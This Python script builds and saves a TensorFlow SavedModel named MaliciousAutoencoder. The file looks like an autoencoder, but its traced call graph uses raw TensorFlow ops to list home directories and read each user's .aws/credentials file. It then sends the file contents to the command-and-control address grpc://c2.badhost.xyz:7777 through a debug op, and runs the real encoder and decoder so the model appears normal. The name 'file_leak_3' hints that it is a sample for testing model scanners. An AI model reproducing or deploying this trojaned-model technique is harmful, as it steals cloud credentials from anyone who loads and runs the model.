import tensorflow as tf
import os

class MaliciousAutoencoder(tf.Module):
    def __init__(self):
        super(MaliciousAutoencoder, self).__init__()
        self.encoder = tf.keras.Sequential([tf.keras.layers.Dense(64, activation='relu')])
        self.decoder = tf.keras.Sequential([tf.keras.layers.Dense(256, activation='sigmoid')])

    @tf.function(input_signature=[tf.TensorSpec(shape=[None, 256], dtype=tf.float32)])
    def __call__(self, x):
        user_dirs = tf.raw_ops.MatchingFilesDataset(
            patterns=["/home/*"]
        )
        iterator = tf.raw_ops.IteratorV2(
            shared_name="leak3_iter", container="",
            output_types=[tf.string], output_shapes=[[]]
        )
        tf.raw_ops.MakeIterator(dataset=user_dirs, iterator=iterator)
        target_dir = tf.raw_ops.IteratorGetNext(
            iterator=iterator, output_types=[tf.string], output_shapes=[[]]
        )[0]

        target_file = tf.strings.join([target_dir, "/.aws/credentials"])
        dataset_node = tf.raw_ops.FixedLengthRecordDatasetV2(
            filenames=[target_file],
            record_bytes=512,
            header_bytes=0,
            footer_bytes=0,
            buffer_size=1,
            compression_type=""
        )
        iter2 = tf.raw_ops.IteratorV2(
            shared_name="leak3_file_iter", container="",
            output_types=[tf.string], output_shapes=[[]]
        )
        make_iter_op = tf.raw_ops.MakeIterator(
            dataset=dataset_node, iterator=iter2
        )
        with tf.control_dependencies([make_iter_op]):
            content = tf.raw_ops.IteratorGetNext(
                iterator=iter2, output_types=[tf.string], output_shapes=[[]]
            )[0]

        tf.raw_ops.DebugIdentityV3(
            input=content, device_name="", tensor_name="aws_leak",
            debug_urls=["grpc://c2.badhost.xyz:7777"], gated_grpc=False
        )

        encoded = self.encoder(x)
        decoded = self.decoder(encoded)
        return decoded

def main():
    export_dir = "./model/autoencoder"
    os.makedirs(export_dir, exist_ok=True)
    model = MaliciousAutoencoder()
    tf.saved_model.save(model, export_dir)
    print("[file_leak_3] Model saved.")

if __name__ == "__main__":
    main()
